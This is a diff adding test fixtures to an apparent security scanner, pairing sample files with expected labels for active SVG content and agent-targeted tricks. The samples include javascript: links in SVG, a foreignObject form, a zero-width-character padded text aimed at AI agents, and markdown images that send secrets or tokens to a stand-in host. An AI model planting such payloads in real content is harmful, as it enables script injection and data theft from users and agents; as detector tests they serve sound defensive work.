@@ -952,6 +952,47 @@ def cases() -> list[tuple[str, bytes, str | None]]:
         ("rooted.bin", b'<?xml version="1.0"?>\n<svg><rect/></svg><script/>', "doc_svg_active"),
         ("prose.svg", b"<svg><desc>The onbegin and onerror attributes.</desc></svg>", None),
         ("foreign.svg", b"<svg><foreignObject></foreignObject></svg>", None),
+        # Scriptless active content: a javascript: link or animation target, or a foreignObject
+        # that embeds a page or a form.
+        (
+            "link-js.svg",
+            b'<svg><a xlink:href="javascript:alert(1)"><text>o</text></a></svg>',
+            "doc_svg_active_link",
+        ),
+        ("link-void.svg", b'<svg><a href="javascript:void(0);"><text>o</text></a></svg>', None),
+        (
+            "set-js.svg",
+            b'<svg><a><set attributeName="href" to="javascript:alert(1)"/><text>o</text></a></svg>',
+            "doc_svg_active_link",
+        ),
+        (
+            "foreign-form.svg",
+            b'<svg><foreignObject><form action="https://example.invalid/"></form>'
+            b"</foreignObject></svg>",
+            "doc_svg_active_link",
+        ),
+        (
+            "foreign-label.svg",
+            b"<svg><foreignObject><div><p>Start</p></div></foreignObject></svg>",
+            None,
+        ),
+        (
+            "svg-comment-link.html",
+            b"<html><svg><!-- label </svg> -->"
+            b'<a href="javascript:f()"><text>o</text></a></svg></html>',
+            "doc_svg_active_link",
+        ),
+        ("page-link.html", b'<html><a href="javascript:f()">x</a><svg><path/></svg></html>', None),
+        (
+            "embedded-link.zip",
+            _zip("icon.svg", b'<svg><a href="javascript:alert(1)"><text>o</text></a></svg>'),
+            "doc_svg_active_link",
+        ),
+        (
+            "run.txt",
+            ("Quarterly notes" + "\u200b\u200c" * 40 + " attached.\n").encode(),
+            "agent_invisible_run",
+        ),
         ("icon.svg", b'<svg><rect width="1" height="1"/></svg>', None),
         ("exfil.md", b"![](https://example.invalid/a.png?q={{secret}})\n", "agent_markdown_exfil"),
         ("link.md", b"[x](https://example.invalid/a?x=${token})\n", "agent_markdown_exfil"),
